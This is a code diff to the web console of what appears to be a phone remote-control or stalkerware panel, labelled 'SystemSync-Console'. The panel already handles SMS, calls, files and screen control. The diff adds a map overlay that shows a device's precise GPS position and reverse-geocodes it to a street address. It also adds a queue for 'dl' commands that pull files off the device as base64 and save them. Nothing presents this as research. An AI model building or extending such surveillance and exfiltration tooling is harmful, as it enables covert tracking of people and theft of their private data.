@@ -109,12 +109,38 @@
             box-shadow:0 2px 8px rgba(0,0,0,0.05);
             padding:20px;
             min-height:100%;
+            position:relative;
         }
 
         /* ===== MAP ===== */
         #map{
             height:400px;
             border-radius:10px;
+        }
+        /* GPS overlay */
+        .map-info {
+            position: absolute;
+            top: 30px;
+            left: 30px;
+            background: rgba(255,255,255,0.95);
+            padding: 8px 12px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            font-size: 13px;
+            color: #1a2634;
+            z-index: 1000;
+            pointer-events: none;
+            border-left: 4px solid #1976ff;
+        }
+        .map-info div {
+            margin: 2px 0;
+        }
+        .map-info .coord {
+            font-weight: 600;
+        }
+        .map-info .addr {
+            color: #2c3e50;
+            font-style: italic;
         }
 
         /* ===== TABLES ===== */
@@ -315,6 +341,7 @@
     let dataType = null;                // 'sms', 'call', 'file'
     let currentPath = "root";           // current directory for file manager
     let selectedFiles = [];              // paths of selected files for download
+    let downloadQueue = [];              // queue of paths for which we've sent 'dl' and await FILE_DATA
 
     // Toggle states
     let screenActive = false;
@@ -495,6 +522,18 @@
             showNotification('Vibration done');
         } else if (msg.startsWith("ERROR:")) {
             panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
+        } else if (msg.startsWith("FILE_DATA:")) {
+            // File download: base64 data follows
+            const base64 = msg.substring(10);
+            // Get the next path from download queue
+            if (downloadQueue.length > 0) {
+                const path = downloadQueue.shift();
+                const filename = path.split('/').pop(); // extract basename
+                downloadBase64(base64, filename);
+            } else {
+                // fallback – should not happen
+                downloadBase64(base64, 'downloaded_file');
+            }
         } else {
             console.log('Unhandled plain text:', msg);
         }
@@ -582,19 +621,48 @@
         `;
     }
 
-    function downloadBase64(b64, name) {
+    function downloadBase64(b64, filename) {
         const a = document.createElement('a');
         a.href = 'data:application/octet-stream;base64,' + b64;
-        a.download = name;
+        a.download = filename;
         a.click();
     }
 
     function renderMap(loc) {
-        panel.innerHTML = '<div id="map"></div>';
+        // Create map container with overlay
+        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
+        const mapDiv = document.getElementById('map');
+
+        // Create info overlay
+        const infoDiv = document.createElement('div');
+        infoDiv.className = 'map-info';
+        infoDiv.innerHTML = `
+            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
+            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
+            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
+            <div class="addr">🌍 Loading address...</div>
+        `;
+        mapDiv.appendChild(infoDiv);
+
+        // Initialize map
         if (mapInstance) mapInstance.remove();
-        mapInstance = L.map('map').setView([loc.lat, loc.lon], 18);
+        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([loc.lat, loc.lon], { radius: loc.acc || loc.accuracy, color: '#1976ff' }).addTo(mapInstance);
+        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
+
+        // Fetch human-readable address using Nominatim
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
+            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+        })
+        .then(response => response.json())
+        .then(data => {
+            const address = data.display_name || 'Address not found';
+            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
+        })
+        .catch(err => {
+            console.error('Geocoding error:', err);
+            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
+        });
     }
 
     // Table render with pagination
@@ -770,9 +838,11 @@
             return;
         }
         selectedFiles.forEach(path => {
+            // Add to queue before sending command
+            downloadQueue.push(path);
             send('dl ' + path);
         });
-        // Optionally, you could clear selection after download
+        // Optionally clear selection after download
         // deselectAllFiles();
     }
 
